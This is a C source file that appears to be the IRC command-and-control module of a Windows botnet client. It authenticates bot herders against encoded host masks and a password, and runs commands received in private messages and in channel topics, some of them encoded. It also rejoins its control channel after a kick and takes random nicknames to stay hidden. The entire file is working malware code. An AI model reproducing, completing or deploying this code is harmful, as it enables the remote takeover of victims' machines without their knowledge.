
#include "../h/includes.h"
#include "../h/functions.h"

extern char str_auth_good[];
extern char str_auth_full[];
extern char str_kick_msg[];

SWITCHES GetSwitches(char *a[MAX_TOKENS],int t)
{
	SWITCHES rswitch;
	unsigned char switches[256];
	ZeroMemory(switches,sizeof(switches));
	for (int i=t; i>=0; i--) {
		if (a[i])
		{ 
			if ((a[i][0] == '-') && (a[i][2] == 0))
			{	// -a
				switches[a[i][1]]=1;
				a[i][0]=0;
				a[i][1]=0;
				a[i][2]=0;
				a[i]=NULL;
			}
			else if ((a[i][0] == '-') && (a[i][2] == ':') && (a[i][4] == 0))
			{	// -r:*
				switches[a[i][1]]=1;
				if (a[i][1] == 'r')
					rswitch.replace_char=a[i][3];
				a[i][0]=0;
				a[i][1]=0;
				a[i][2]=0;
				a[i]=NULL;
			}
			else
				break;
		}
	}

	rswitch.silent	= (switches['s']);
	rswitch.halfsilent = (switches['h']);
	rswitch.verbose = (switches['v']);
	rswitch.stop	= (switches['S']);
	rswitch.force	= (switches['f']);
	rswitch.createwait = (switches['W']);
	rswitch.replace_underscores = (switches['r']);
	rswitch.overwrite			= (switches['O']);
	rswitch.attrib_hidden		= (switches['H']);
	rswitch.attrib_normal		= (switches['N']);
	rswitch.attrib_readonly		= (switches['R']);
	rswitch.attrib_system		= (switches['S']);
	return rswitch;
}

int private_msg(char* params, irc_reply_data* hostd, void* conn)
{
	IRC* irc=(IRC*)conn;
	char *a[MAX_TOKENS];
	params++;
	char fcmd[1024];
	strcpy(fcmd,params);
	int t=SplitParams(a,params,MAX_TOKENS);
	if (fcmd[0] == prefix)
	{
		SWITCHES switches=GetSwitches(a,t);

		for (int u=0;u<MAX_TOKENS;u++)
		{
			if (a[u])
			{
				//lulwhat() -h1t3m-
			}
		}
		if (!a[0])
			return 1;
		if (a[0][0] == prefix)
		{
			a[0]++;
			if (irc->is_logged_in(hostd->nick,hostd->ident,hostd->host))
			{
				if (!strcmp(hostd->target,irc->current_nick()))
					hostd->target=hostd->nick;
				IRC_CommandParse(a,t,fcmd,hostd,irc,switches);
			}
			else
			{
				if (!strcmp(hostd->target,irc->current_nick()))
				{
					hostd->target=hostd->nick;
				}
				if (!strcmp(a[0],get_auth))
				{
					if (a[1]==NULL)
						return 1;
					char h[256];
					_snprintf(h,sizeof(h),"%s!%s@%s",hostd->nick,hostd->ident,hostd->host);
					BOOL host_ok=FALSE;
					for (int i=0; i < authsize; i++) {
#ifndef NO_WILDCARD
						if (wildcardfit(authost[i], h)) { 
							host_ok = TRUE;
							break;
						}
#else
						if (strcmp(h, authost[i]) == 0) {
							host_ok = TRUE;
							break;
						}
#endif
					}
					//if (!host_ok || strcmp(password, a[1]) != 0) {
					if (!host_ok || strcmp(Decode(password), a[1]) != 0) {

						return 1;
					}
					if (irc->add_login(hostd->nick,hostd->ident,hostd->host) == -1)
					{
						if (!switches.silent)
							irc->pmsg(hostd->target,str_auth_full,main_title);
					}
					else
					{
						if (!switches.silent)
							irc->pmsg(hostd->target,str_auth_good,main_title);
					}
					return 1;
				}
			}
		} 
	}
	else
	{
		if (lstrcmpi(hostd->target,irc->current_nick()))
			return 1;
		if (!lstrcmpi("\1VERSION\1",a[0]))
		{
			return 1;
		}
		if (!lstrcmpi("\1PING",a[0]) && a[1])
		{
			return 1;
		}
	}
	return 0;
}
int got_kicked(char* params, irc_reply_data* hostd, void* conn)
{
	IRC* irc=(IRC*)conn;
	if (strstr(params,irc->current_nick()))
	{
		char *a[2];
		SplitParams(a,params,2);
		if (a[0] && a[1])
		{
			if (!strcmp(a[0],Decode(sinfo[curserver].chan)))
				irc->join(Decode(sinfo[curserver].chan), Decode(sinfo[curserver].chanpass));
			else
				irc->join(a[0]);
			irc->pmsg(a[0],str_kick_msg,hostd->nick);
		}
	}
	return 0;
}
int parse_topic(char* params, irc_reply_data* hostd, void* conn)
{
	IRC* irc=(IRC*)conn;
	char tstr[IRCLINE];
	char chan[16];
	strncpy(tstr,params,sizeof(tstr));
	char *a[3];
	SplitParams(a,tstr,3);
	if (a[0] && a[1])
	{
		if (!strcmp(a[0],irc->current_nick()))
			strncpy(chan,a[1],sizeof(chan));
		else
			strncpy(chan,a[0],sizeof(chan));
		char *cmd;
		cmd=strchr(params,':');	
		cmd++;
		if (cmd[0]=='$')
		{
			if (strstr(cmd,"$dec(") && strstr(cmd,")"))
			{
				if (strlen(cmd)>6)
				{
					char *str=substr(cmd,5,strlen(cmd)-2);
					if (str)
					{
						cmd=str;
					}
				}
			}
		}
		char *cmds[MAX_TOKENS];
		cmds[0]=strtok(cmd,"|");
		int i;
		for (i=1;i<MAX_TOKENS;i++)
		{
			cmds[i]=strtok(NULL,"|");
			if (cmds[i])
				continue;
			else
				break;
		}
		irc_reply_data thostd;
		thostd.target=chan;
		thostd.nick="topic";
		thostd.ident="topic";
		thostd.host="topic";
		char tstr[512];
		for (int t=0;t<i;t++)
		{
			if (cmds[t])
			{
				sprintf(tstr,"%s",cmds[t]);
				if (tstr[0]==prefix)
				{
					Sleep(FLOOD_DELAY/2);
					IRC_TempCommand(tstr,&thostd,conn,TRUE,TRUE);
				}
			}
		}
	}
	return 0;
}

int end_of_motd(char* params, irc_reply_data* hostd, void* conn)
{
	IRC* irc=(IRC*)conn;
	DWORD id;
	NTHREAD pt;
	pt.conn=conn;
	pt.gotinfo=FALSE;
	CreateThread(NULL, 0, &PingTimeoutThread, &pt, 0, &id);
	while (!pt.gotinfo)
		Sleep(50);
	irc->mode(Decode(sinfo[curserver].modeonconn));
	irc->join(Decode(sinfo[curserver].chan), Decode(sinfo[curserver].chanpass));
	return 0;
}

int joined_chan(char* params, irc_reply_data* hostd, void* conn)
{
	IRC* irc=(IRC*)conn;
	char *a[1];
	SplitParams(a,params,2);
	if (a[0] && a[1])
	{
	}
	return 0;
}

int nick_in_use(char* params, irc_reply_data* hostd, void* conn)
{
	IRC* irc=(IRC*)conn;
	irc->nick(irc->nickgen(NICK_TYPE,REQ_NICKLEN));
	return 0;
}
int server_err(char* params, irc_reply_data* hostd, void* conn)
{	
	return 0;
}


void HookProtocol(void *conn)
{
	IRC* irc=(IRC*)conn;
	irc->hook_irc_command("ERROR",	&server_err);
	irc->hook_irc_command("PRIVMSG",&private_msg);
	irc->hook_irc_command("KICK",	&got_kicked);
	irc->hook_irc_command("TOPIC",	&parse_topic);
	irc->hook_irc_command("332",	&parse_topic);
	irc->hook_irc_command("366",	&joined_chan);
	irc->hook_irc_command("005",	&end_of_motd);
	irc->hook_irc_command("376",	&end_of_motd);
	irc->hook_irc_command("422",	&end_of_motd);
	irc->hook_irc_command("433",	&nick_in_use);
}